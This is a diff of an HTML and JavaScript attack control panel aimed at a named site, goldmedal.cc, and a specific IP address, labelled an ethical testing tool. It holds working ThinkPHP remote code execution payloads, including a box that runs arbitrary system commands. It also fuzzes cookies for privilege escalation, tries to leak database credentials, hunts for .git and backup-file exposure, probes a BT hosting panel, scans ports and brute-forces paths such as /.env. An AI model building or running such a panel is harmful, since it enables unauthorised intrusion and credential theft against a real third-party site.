@@ -1,179 +1,836 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Test Control Panel - goldmedal.cc</title>
+    <title>🔬 GoldMedal.cc - Ethical Hacking Lab</title>
     <style>
-        :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --text: #c9d1d9; --accent: #58a6ff; --red: #f85149; --green: #3fb950; }
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Segoe UI', system-ui, sans-serif; background: var(--bg); color: var(--text); padding: 16px; }
-        h1 { color: var(--accent); margin-bottom: 8px; font-size: 1.4em; }
-        .subtitle { color: #8b949e; margin-bottom: 20px; font-size: 0.85em; }
-        .card { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 16px; margin-bottom: 16px; }
-        .card h2 { font-size: 1em; margin-bottom: 12px; color: var(--accent); }
-        input, textarea, select, button { width: 100%; padding: 10px; margin: 6px 0; background: var(--bg); border: 1px solid var(--border); border-radius: 6px; color: var(--text); font-size: 0.9em; }
-        button { background: #238636; border: none; font-weight: 600; cursor: pointer; }
-        button:hover { background: #2ea043; }
-        button.danger { background: #da3633; }
-        button.danger:hover { background: #f85149; }
-        .output { background: #000; color: var(--green); padding: 10px; border-radius: 6px; font-family: monospace; font-size: 0.75em; max-height: 300px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; margin-top: 8px; }
-        .status { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 0.75em; font-weight: 600; }
-        .status.ok { background: #238636; }
-        .status.err { background: #da3633; }
-        .flex-row { display: flex; gap: 8px; }
-        .flex-row > * { flex: 1; }
-        @media (max-width: 600px) { .flex-row { flex-direction: column; } }
+        :root {
+            --bg: #0a0e14;
+            --card: #131820;
+            --border: #1e2733;
+            --text: #c9d1d9;
+            --accent: #58a6ff;
+            --red: #f85149;
+            --green: #3fb950;
+            --orange: #f0883e;
+            --purple: #a371f7;
+            --yellow: #d2991d;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            padding: 16px;
+            min-height: 100vh;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 24px;
+            padding: 20px;
+            background: linear-gradient(135deg, #131820 0%, #1a1f2e 100%);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+        }
+        
+        .header h1 {
+            color: var(--accent);
+            font-size: 1.8em;
+            margin-bottom: 8px;
+        }
+        
+        .header .badge {
+            display: inline-block;
+            background: #238636;
+            color: #fff;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.75em;
+            font-weight: 600;
+            margin: 4px;
+        }
+        
+        .header .badge.warning {
+            background: #9e6a03;
+        }
+        
+        .subtitle {
+            color: #8b949e;
+            font-size: 0.85em;
+            margin-top: 8px;
+        }
+        
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
+            gap: 16px;
+        }
+        
+        .card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 16px;
+            transition: all 0.3s ease;
+        }
+        
+        .card:hover {
+            border-color: #30363d;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        }
+        
+        .card.danger-card {
+            border-left: 3px solid var(--red);
+        }
+        
+        .card.warning-card {
+            border-left: 3px solid var(--orange);
+        }
+        
+        .card.info-card {
+            border-left: 3px solid var(--accent);
+        }
+        
+        .card.purple-card {
+            border-left: 3px solid var(--purple);
+        }
+        
+        .card h2 {
+            font-size: 1em;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .card h2 .icon {
+            font-size: 1.3em;
+        }
+        
+        input, textarea, select, button {
+            width: 100%;
+            padding: 10px 12px;
+            margin: 6px 0;
+            background: #0d1117;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text);
+            font-size: 0.9em;
+            font-family: inherit;
+            transition: border-color 0.2s;
+        }
+        
+        input:focus, textarea:focus, select:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.1);
+        }
+        
+        button {
+            background: #238636;
+            border: 1px solid rgba(240, 246, 252, 0.1);
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        button:hover {
+            background: #2ea043;
+            transform: translateY(-1px);
+        }
+        
+        button:active {
+            transform: translateY(0);
+        }
+        
+        button.danger {
+            background: #da3633;
+        }
+        
+        button.danger:hover {
+            background: #f85149;
+        }
+        
+        button.warning {
+            background: #9e6a03;
+        }
+        
+        button.warning:hover {
+            background: #bb8009;
+        }
+        
+        button.purple {
+            background: #6e40c9;
+        }
+        
+        button.purple:hover {
+            background: #7c4dff;
+        }
+        
+        .flex-row {
+            display: flex;
+            gap: 8px;
+        }
+        
+        .flex-row > * {
+            flex: 1;
+        }
+        
+        .output {
+            background: #000;
+            color: #3fb950;
+            padding: 12px;
+            border-radius: 6px;
+            font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
+            font-size: 0.7em;
+            max-height: 350px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            margin-top: 10px;
+            border: 1px solid #1a3a1a;
+            line-height: 1.5;
+        }
+        
+        .output.error {
+            color: #f85149;
+            border-color: #3a1a1a;
+        }
+        
+        .output.loading {
+            color: #d2991d;
+            border-color: #3a3a1a;
+        }
+        
+        .tag {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.7em;
+            font-weight: 600;
+            margin: 2px;
+        }
+        
+        .tag.found {
+            background: #238636;
+            color: #fff;
+        }
+        
+        .tag.not-found {
+            background: #30363d;
+            color: #8b949e;
+        }
+        
+        .tag.critical {
+            background: #da3633;
+            color: #fff;
+        }
+        
+        .stats {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+            margin-bottom: 16px;
+        }
+        
+        .stat-box {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px;
+            text-align: center;
+            flex: 1;
+            min-width: 80px;
+        }
+        
+        .stat-box .number {
+            font-size: 1.5em;
+            font-weight: 700;
+            color: var(--accent);
+        }
+        
+        .stat-box .label {
+            font-size: 0.7em;
+            color: #8b949e;
+            margin-top: 4px;
+        }
+        
+        pre {
+            margin: 0;
+            white-space: pre-wrap;
+        }
+        
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: #0d1117;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #30363d;
+            border-radius: 3px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: #444;
+        }
+        
+        @media (max-width: 600px) {
+            .grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .flex-row {
+                flex-direction: column;
+            }
+            
+            .header h1 {
+                font-size: 1.3em;
+            }
+            
+            body {
+                padding: 8px;
+            }
+        }
     </style>
 </head>
 <body>
-    <h1>🔬 goldmedal.cc Test Panel</h1>
-    <p class="subtitle">Ethical Testing Tool — Own Environment Only</p>
 
-    <!-- URL Proxy Tester -->
-    <div class="card">
-        <h2>🌐 Request Proxy (Bypass CORS)</h2>
-        <div class="flex-row">
-            <input type="text" id="proxyPath" value="/index.php" placeholder="Path (e.g., /index.php)">
-            <select id="proxyMethod">
-                <option>GET</option>
-                <option>POST</option>
-            </select>
-        </div>
-        <input type="text" id="proxyCookie" placeholder="Cookie value (base64 encoded automatically)">
-        <button onclick="sendProxy()">Send Request</button>
-        <div class="output" id="proxyOutput">Results will appear here...</div>
+    <!-- Header -->
+    <div class="header">
+        <h1>🔬 GoldMedal.cc Test Panel</h1>
+        <span class="badge">ThinkPHP 5.1.41</span>
+        <span class="badge">nginx/1.20.1</span>
+        <span class="badge warning">Debug Mode ON</span>
+        <span class="badge warning">BT Panel Detected</span>
+        <p class="subtitle">⚠️ Ethical Testing Only — Own Environment — goldmedal.cc</p>
     </div>
 
-    <!-- Cookie Tester -->
-    <div class="card">
-        <h2>🍪 Cookie Manipulation</h2>
-        <p style="font-size:0.8em;color:#8b949e;">Found: username=TWFydWZiZWxheQ== (Base64 → <b>Marufbelay</b>)</p>
-        <div class="flex-row">
-            <input type="text" id="cookieValue" value="admin" placeholder="Try: admin, root, 1">
-            <input type="text" id="cookieEncoded" value="YWRtaW4=" placeholder="Base64 output" readonly>
+    <!-- Quick Stats -->
+    <div class="stats">
+        <div class="stat-box">
+            <div class="number" id="totalEndpoints">0</div>
+            <div class="label">Endpoints Found</div>
         </div>
-        <button onclick="encodeBase64()">Encode</button>
-        <button onclick="testCookie()">Test This Cookie</button>
-        <div class="output" id="cookieOutput">Cookie test results...</div>
+        <div class="stat-box">
+            <div class="number" id="criticalFindings">0</div>
+            <div class="label">Critical Findings</div>
+        </div>
+        <div class="stat-box">
+            <div class="number" id="serverStatus">⬤</div>
+            <div class="label">Server Status</div>
+        </div>
     </div>
 
-    <!-- ThinkPHP RCE Test -->
-    <div class="card">
-        <h2>💣 ThinkPHP 5.1.41 Tests</h2>
-        <button onclick="testThinkPHP()">Run All RCE Payloads</button>
-        <div class="flex-row">
-            <button onclick="quickTest('phpinfo')">PHP Info</button>
-            <button onclick="quickTest('database')">DB Config</button>
-            <button onclick="quickTest('config')">App Config</button>
-        </div>
-        <div class="output" id="rceOutput">RCE test results...</div>
-    </div>
+    <!-- Card Grid -->
+    <div class="grid">
 
-    <!-- Directory Brute -->
-    <div class="card">
-        <h2>📁 Quick Path Finder</h2>
-        <button onclick="brutePaths()">Brute Common Paths</button>
-        <div class="output" id="bruteOutput">Path scan results...</div>
+        <!-- 1. Proxy Tester -->
+        <div class="card info-card">
+            <h2><span class="icon">🌐</span> Request Proxy</h2>
+            <div class="flex-row">
+                <input type="text" id="proxyPath" value="/index.php" placeholder="Path">
+                <select id="proxyMethod">
+                    <option>GET</option>
+                    <option>POST</option>
+                </select>
+            </div>
+            <input type="text" id="proxyCookie" placeholder="Cookie value (auto base64 encoded)">
+            <input type="text" id="proxyPostData" placeholder="POST data (JSON or form data)">
+            <button onclick="sendProxy()">🚀 Send Request</button>
+            <div class="output" id="proxyOutput">Ready. Enter a path and send.</div>
+        </div>
+
+        <!-- 2. Cookie Manipulation -->
+        <div class="card purple-card">
+            <h2><span class="icon">🍪</span> Cookie Manipulation</h2>
+            <p style="font-size:0.75em;color:#8b949e;margin-bottom:8px;">
+                Found: <code>username=TWFydWZiZWxheQ==</code> → <b>Marufbelay</b>
+            </p>
+            <div class="flex-row">
+                <input type="text" id="cookieValue" value="admin" placeholder="Try: admin, root">
+                <input type="text" id="cookieEncoded" value="YWRtaW4=" readonly>
+            </div>
+            <button onclick="encodeBase64()">🔄 Encode</button>
+            <button class="purple" onclick="testCookie()">🧪 Test Single Cookie</button>
+            <button class="purple" onclick="huntCookies()">🎯 Fuzz All Cookies</button>
+            <div class="output" id="cookieOutput">Cookie test results...</div>
+        </div>
+
+        <!-- 3. ThinkPHP Config Leak -->
+        <div class="card warning-card">
+            <h2><span class="icon">🗄️</span> Hunt: Database Config</h2>
+            <p style="font-size:0.75em;color:#8b949e;margin-bottom:8px;">
+                Attempt to leak database credentials via ThinkPHP config
+            </p>
+            <button class="warning" onclick="huntDB()">🔓 Leak Database Config</button>
+            <div class="output" id="dbOutput">Click to attempt config extraction...</div>
+        </div>
+
+        <!-- 4. RCE Payloads -->
+        <div class="card danger-card">
+            <h2><span class="icon">☠️</span> Hunt: RCE Payloads</h2>
+            <p style="font-size:0.75em;color:#8b949e;margin-bottom:8px;">
+                ThinkPHP 5.1.41 - CVE-2018-20062 & others
+            </p>
+            <button class="danger" onclick="huntRCE()">💣 Fire All RCE Payloads</button>
+            <div class="flex-row">
+                <button class="danger" onclick="quickRCE('phpinfo')">PHP Info</button>
+                <button class="danger" onclick="quickRCE('whoami')">Whoami</button>
+                <button class="danger" onclick="quickRCE('ls')">List Files</button>
+            </div>
+            <div class="output" id="rceHuntOutput">RCE test results...</div>
+        </div>
+
+        <!-- 5. .git Leak -->
+        <div class="card warning-card">
+            <h2><span class="icon">📂</span> Hunt: .git Exposure</h2>
+            <p style="font-size:0.75em;color:#8b949e;margin-bottom:8px;">
+                Check if .git directory is publicly accessible
+            </p>
+            <button class="warning" onclick="huntGit()">🔍 Check .git Leak</button>
+            <div class="output" id="gitOutput">Results...</div>
+        </div>
+
+        <!-- 6. Backup Files -->
+        <div class="card warning-card">
+            <h2><span class="icon">📦</span> Hunt: Backup Files</h2>
+            <p style="font-size:0.75em;color:#8b949e;margin-bottom:8px;">
+                Search for exposed backup archives and SQL dumps
+            </p>
+            <button class="warning" onclick="huntBackups()">📥 Search Backup Files</button>
+            <div class="output" id="backupOutput">Results...</div>
+        </div>
+
+        <!-- 7. BT Panel -->
+        <div class="card danger-card">
+            <h2><span class="icon">🖥️</span> Hunt: BT Panel Access</h2>
+            <p style="font-size:0.75em;color:#8b949e;margin-bottom:8px;">
+                Target IP: <code>31.59.114.216</code> | Path: <code>/www/wwwroot/</code>
+            </p>
+            <div class="flex-row">
+                <button class="danger" onclick="huntBTPanel()">🔍 Check BT Panel</button>
+                <button class="danger" onclick="huntPorts()">🔌 Scan Ports</button>
+            </div>
+            <div class="output" id="btOutput">Results...</div>
+        </div>
+
+        <!-- 8. Path Brute-force -->
+        <div class="card info-card">
+            <h2><span class="icon">📁</span> Path Discovery</h2>
+            <p style="font-size:0.75em;color:#8b949e;margin-bottom:8px;">
+                Brute-force common paths and endpoints
+            </p>
+            <button onclick="brutePaths()">🔎 Brute Common Paths</button>
+            <div class="output" id="bruteOutput">Path scan results...</div>
+        </div>
+
+        <!-- 9. Custom RCE Command -->
+        <div class="card danger-card">
+            <h2><span class="icon">💀</span> Custom RCE Command</h2>
+            <p style="font-size:0.75em;color:#8b949e;margin-bottom:8px;">
+                Execute custom system command if RCE is found
+            </p>
+            <div class="flex-row">
+                <input type="text" id="customCmd" value="id" placeholder="Command: id, whoami, ls -la">
+                <button class="danger" onclick="customRCE()">Execute</button>
+            </div>
+            <div class="output" id="customRCEOutput">Enter a command...</div>
+        </div>
+
+        <!-- 10. Findings Log -->
+        <div class="card" style="grid-column: 1 / -1;">
+            <h2><span class="icon">📋</span> Findings Log</h2>
+            <button onclick="clearLog()" style="width:auto;display:inline-block;margin-bottom:8px;">🗑️ Clear Log</button>
+            <div class="output" id="findingsLog" style="min-height:100px;">
+                Session started...
+            </div>
+        </div>
+
     </div>
 
     <script>
-        const BASE = window.location.origin; // Your Render URL
+        const BASE = window.location.origin;
+        let findingsCount = 0;
 
+        // ============ UTILITY FUNCTIONS ============
         function showLoading(elemId) {
-            document.getElementById(elemId).innerHTML = '<span style="color:#d2991d;">⏳ Loading...</span>';
+            const el = document.getElementById(elemId);
+            el.innerHTML = '⏳ <span style="color:#d2991d;">Loading...</span>';
+            el.className = 'output loading';
         }
 
-        // Base64 Encode
+        function showResult(elemId, data, isError) {
+            const el = document.getElementById(elemId);
+            el.textContent = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
+            el.className = isError ? 'output error' : 'output';
+        }
+
+        function logFinding(message, severity) {
+            findingsCount++;
+            const log = document.getElementById('findingsLog');
+            const time = new Date().toLocaleTimeString();
+            const icons = { critical: '🔴', high: '🟠', medium: '🟡', low: '🔵', info: '⚪' };
+            const icon = icons[severity] || '⚪';
+            log.textContent = `[${time}] ${icon} ${message}\n` + log.textContent;
+            document.getElementById('criticalFindings').textContent = findingsCount;
+        }
+
+        function clearLog() {
+            document.getElementById('findingsLog').textContent = 'Session started...\n';
+            findingsCount = 0;
+            document.getElementById('criticalFindings').textContent = '0';
+        }
+
+        // ============ BASE64 ENCODE ============
         function encodeBase64() {
             const val = document.getElementById('cookieValue').value;
-            document.getElementById('cookieEncoded').value = btoa(val);
+            try {
+                document.getElementById('cookieEncoded').value = btoa(val);
+            } catch(e) {
+                document.getElementById('cookieEncoded').value = 'Encoding error: ' + e.message;
+            }
         }
         document.getElementById('cookieValue').addEventListener('input', encodeBase64);
 
-        // Send proxy request
+        // ============ PROXY REQUEST ============
         async function sendProxy() {
             showLoading('proxyOutput');
             const path = document.getElementById('proxyPath').value;
             const method = document.getElementById('proxyMethod').value;
             const cookieVal = document.getElementById('cookieValue').value;
+            const postData = document.getElementById('proxyPostData').value;
 
             let url = `${BASE}/proxy?path=${encodeURIComponent(path)}`;
             if (cookieVal) url += `&custom_cookie=${encodeURIComponent(cookieVal)}`;
 
             try {
-                const resp = await fetch(url, { method: method });
+                const options = { method: method };
+                if (method === 'POST' && postData) {
+                    options.headers = { 'Content-Type': 'application/json' };
+                    options.body = postData;
+                }
+                const resp = await fetch(url, options);
                 const data = await resp.json();
-                document.getElementById('proxyOutput').textContent = JSON.stringify(data, null, 2);
+                showResult('proxyOutput', data);
+                
+                // Auto-log interesting findings
+                if (data.status_code === 200 && data.length && data.length < 500) {
+                    logFinding(`Interesting response at ${path} (${data.length} bytes)`, 'medium');
+                }
+                if (data.body && data.body.includes('password')) {
+                    logFinding(`POSSIBLE PASSWORD LEAK at ${path}!`, 'critical');
+                }
             } catch(e) {
-                document.getElementById('proxyOutput').textContent = 'Error: ' + e.message;
+                showResult('proxyOutput', 'Error: ' + e.message, true);
             }
         }
 
-        // Test cookie
+        // ============ COOKIE TESTING ============
         async function testCookie() {
             showLoading('cookieOutput');
             const val = document.getElementById('cookieValue').value;
             try {
                 const resp = await fetch(`${BASE}/test/cookie/${encodeURIComponent(val)}`);
                 const data = await resp.json();
-                document.getElementById('cookieOutput').textContent = JSON.stringify(data, null, 2);
+                showResult('cookieOutput', data);
+                
+                if (data.different_from_default) {
+                    logFinding(`Cookie value "${val}" produced different response!`, 'high');
+                }
             } catch(e) {
-                document.getElementById('cookieOutput').textContent = 'Error: ' + e.message;
+                showResult('cookieOutput', 'Error: ' + e.message, true);
             }
         }
 
-        // ThinkPHP RCE tests
-        async function testThinkPHP() {
-            showLoading('rceOutput');
+        async function huntCookies() {
+            showLoading('cookieOutput');
             try {
-                const resp = await fetch(`${BASE}/test/thinkphp-rce`);
+                const resp = await fetch(`${BASE}/hunt/cookie-fuzz`);
                 const data = await resp.json();
-                document.getElementById('rceOutput').textContent = JSON.stringify(data, null, 2);
+                showResult('cookieOutput', data);
+                
+                // Log impactful findings
+                if (Array.isArray(data)) {
+                    data.forEach(item => {
+                        if (item.potential_impact) {
+                            logFinding(`Cookie value "${item.value}" may have privilege escalation potential!`, 'critical');
+                        }
+                    });
+                }
             } catch(e) {
-                document.getElementById('rceOutput').textContent = 'Error: ' + e.message;
+                showResult('cookieOutput', 'Error: ' + e.message, true);
             }
         }
 
-        async function quickTest(type) {
-            showLoading('rceOutput');
+        // ============ DATABASE CONFIG ============
+        async function huntDB() {
+            showLoading('dbOutput');
+            try {
+                const resp = await fetch(`${BASE}/hunt/thinkphp-config`);
+                const data = await resp.json();
+                showResult('dbOutput', data);
+                
+                if (Array.isArray(data)) {
+                    data.forEach(item => {
+                        if (item.snippet && item.snippet.includes('password')) {
+                            logFinding('DATABASE CREDENTIALS MAY BE EXPOSED!', 'critical');
+                        }
+                        if (item.snippet && item.snippet.includes('hostname')) {
+                            logFinding(`Database hostname found: check results`, 'high');
+                        }
+                    });
+                }
+            } catch(e) {
+                showResult('dbOutput', 'Error: ' + e.message, true);
+            }
+        }
+
+        // ============ RCE PAYLOADS ============
+        async function huntRCE() {
+            showLoading('rceHuntOutput');
+            try {
+                const resp = await fetch(`${BASE}/hunt/rce-payloads`);
+                const data = await resp.json();
+                showResult('rceHuntOutput', data);
+                
+                if (Array.isArray(data)) {
+                    data.forEach(item => {
+                        if (item.status === 200 && item.length > 100) {
+                            logFinding(`Potential RCE! Payload returned ${item.length} bytes`, 'critical');
+                        }
+                    });
+                }
+            } catch(e) {
+                showResult('rceHuntOutput', 'Error: ' + e.message, true);
+            }
+        }
+
+        async function quickRCE(type) {
+            showLoading('rceHuntOutput');
             const payloads = {
                 'phpinfo': '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1',
-                'database': '/index.php?s=index/think\\config/get&name=database',
-                'config': '/index.php?s=index/think\\config/get&name=app'
+                'whoami': '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami',
+                'ls': '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls%20-la',
             };
             try {
                 const resp = await fetch(`${BASE}/proxy?path=${encodeURIComponent(payloads[type])}`);
                 const data = await resp.json();
-                document.getElementById('rceOutput').textContent = JSON.stringify(data, null, 2);
+                showResult('rceHuntOutput', data);
+                
+                if (data.status_code === 200 && data.length > 50) {
+                    logFinding(`RCE test "${type}" returned data! Possible command execution.`, 'critical');
+                }
             } catch(e) {
-                document.getElementById('rceOutput').textContent = 'Error: ' + e.message;
+                showResult('rceHuntOutput', 'Error: ' + e.message, true);
             }
         }
 
-        // Path brute
+        async function customRCE() {
+            showLoading('customRCEOutput');
+            const cmd = document.getElementById('customCmd').value;
+            const payload = `/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=${encodeURIComponent(cmd)}`;
+            try {
+                const resp = await fetch(`${BASE}/proxy?path=${encodeURIComponent(payload)}`);
+                const data = await resp.json();
+                showResult('customRCEOutput', data);
+                
+                if (data.status_code === 200 && data.length > 20) {
+                    logFinding(`Custom RCE "${cmd}" executed! Check output.`, 'critical');
+                }
+            } catch(e) {
+                showResult('customRCEOutput', 'Error: ' + e.message, true);
+            }
+        }
+
+        // ============ .GIT LEAK ============
+        async function huntGit() {
+            showLoading('gitOutput');
+            try {
+                const resp = await fetch(`${BASE}/hunt/git-leak`);
+                const data = await resp.json();
+                showResult('gitOutput', data);
+                
+                if (Array.isArray(data)) {
+                    data.forEach(item => {
+                        if (item.status === 200) {
+                            logFinding(`.git LEAK! ${item.path} is accessible! Source code exposed.`, 'critical');
+                        }
+                    });
+                }
+            } catch(e) {
+                showResult('gitOutput', 'Error: ' + e.message, true);
+            }
+        }
+
+        // ============ BACKUP FILES ============
+        async function huntBackups() {
+            showLoading('backupOutput');
+            try {
+                const resp = await fetch(`${BASE}/hunt/backup-files`);
+                const data = await resp.json();
+                showResult('backupOutput', data);
+                
+                if (Array.isArray(data)) {
+                    data.forEach(item => {
+                        if (item.status === 200 && item.length > 1000) {
+                            logFinding(`BACKUP FILE FOUND: ${item.file} (${item.length} bytes)!`, 'critical');
+                        } else if (item.status === 200) {
+                            logFinding(`File found: ${item.file}`, 'medium');
+                        }
+                    });
+                }
+            } catch(e) {
+                showResult('backupOutput', 'Error: ' + e.message, true);
+            }
+        }
+
+        // ============ BT PANEL ============
+        async function huntBTPanel() {
+            showLoading('btOutput');
+            try {
+                const resp = await fetch(`${BASE}/hunt/bt-panel`);
+                const data = await resp.json();
+                showResult('btOutput', data);
+                
+                if (Array.isArray(data)) {
+                    data.forEach(item => {
+                        if (item.has_bt_keyword) {
+                            logFinding(`BT Panel detected at ${item.url}!`, 'critical');
+                        }
+                        if (item.status === 200) {
+                            logFinding(`Open port found: ${item.url}`, 'high');
+                        }
+                    });
+                }
+            } catch(e) {
+                showResult('btOutput', 'Error: ' + e.message, true);
+            }
+        }
+
+        async function huntPorts() {
+            showLoading('btOutput');
+            try {
+                const resp = await fetch(`${BASE}/hunt/scan-common-ports`);
+                const data = await resp.json();
+                showResult('btOutput', data);
+                
+                if (Array.isArray(data)) {
+                    const openPorts = data.filter(p => p.open);
+                    openPorts.forEach(p => {
+                        logFinding(`OPEN PORT: ${p.port} on 31.59.114.216`, 'high');
+                    });
+                    if (openPorts.length === 0) {
+                        logFinding('No common ports open (may be firewalled)', 'info');
+                    }
+                }
+            } catch(e) {
+                showResult('btOutput', 'Error: ' + e.message, true);
+            }
+        }
+
+        // ============ PATH BRUTE-FORCE ============
         async function brutePaths() {
             showLoading('bruteOutput');
             const paths = [
-                '/index.php', '/admin.html', '/login.html', '/dashboard.html',
-                '/robots.txt', '/.env', '/.git/HEAD', '/phpinfo.php',
-                '/index.php?s=index', '/index.php?s=admin', '/index.php?s=api',
-                '/index.php?s=user', '/index.php?s=user/login', '/install.php',
-                '/backup.zip', '/admin.php', '/config.php'
+                '/index.php',
+                '/index.php?s=index',
+                '/index.php?s=index/index/index',
+                '/index.php?s=admin',
+                '/index.php?s=admin/index',
+                '/index.php?s=api',
+                '/index.php?s=api/index',
+                '/index.php?s=user',
+                '/index.php?s=user/index',
+                '/index.php?s=user/login',
+                '/index.php?s=user/AddTikuan',
+                '/index.php?s=home',
+                '/index.php?s=home/index',
+                '/index.php?s=install',
+                '/index.php?s=captcha',
+                '/admin.html',
+                '/login.html',
+                '/dashboard.html',
+                '/register.html',
+                '/robots.txt',
+                '/sitemap.xml',
+                '/.env',
+                '/.git/HEAD',
+                '/.git/config',
+                '/phpinfo.php',
+                '/info.php',
+                '/test.php',
+                '/install.php',
+                '/admin.php',
+                '/config.php',
+                '/backup.zip',
+                '/backup.tar.gz',
+                '/backup.sql',
+                '/database.sql',
+                '/api/v1/',
+                '/api/user',
+                '/api/admin',
             ];
+            
             const results = [];
             for (const p of paths) {
                 try {
                     const resp = await fetch(`${BASE}/proxy?path=${encodeURIComponent(p)}`);
                     const data = await resp.json();
-                    results.push({path: p, status: data.status_code, length: data.length});
+                    const status = data.status_code || 'error';
+                    results.push({
+                        path: p,
+                        status: status,
+                        length: data.length || 0
+                    });
+                    
+                    if (status === 200 && data.length > 0 && data.length < 10000) {
+                        logFinding(`Valid endpoint: ${p} (${data.length} bytes)`, 'medium');
+                    }
+                    if (data.body && (data.body.includes('password') || data.body.includes('DB_'))) {
+                        logFinding(`SENSITIVE DATA at ${p}!`, 'critical');
+                    }
                 } catch(e) {
-                    results.push({path: p, error: e.message});
+                    results.push({ path: p, error: e.message });
                 }
             }
-            document.getElementById('bruteOutput').textContent = JSON.stringify(results, null, 2);
+            showResult('bruteOutput', results);
+            document.getElementById('totalEndpoints').textContent = 
+                results.filter(r => r.status === 200).length;
         }
+
+        // ============ INITIAL SERVER CHECK ============
+        async function checkServer() {
+            try {
+                const resp = await fetch(`${BASE}/proxy?path=/`);
+                const data = await resp.json();
+                document.getElementById('serverStatus').textContent = 
+                    data.status_code ? '🟢 UP' : '🔴 DOWN';
+                document.getElementById('serverStatus').style.color = 
+                    data.status_code ? '#3fb950' : '#f85149';
+            } catch(e) {
+                document.getElementById('serverStatus').textContent = '🔴 DOWN';
+                document.getElementById('serverStatus').style.color = '#f85149';
+            }
+        }
+
+        // ============ INIT ============
+        checkServer();
+        encodeBase64();
+        console.log('🔬 GoldMedal.cc Test Panel Ready');
+        console.log('⚠️ Ethical use only - own environment');
+        console.log('📋 Base URL:', BASE);
     </script>
+
 </body>
-    </html>
+                                                         </html>
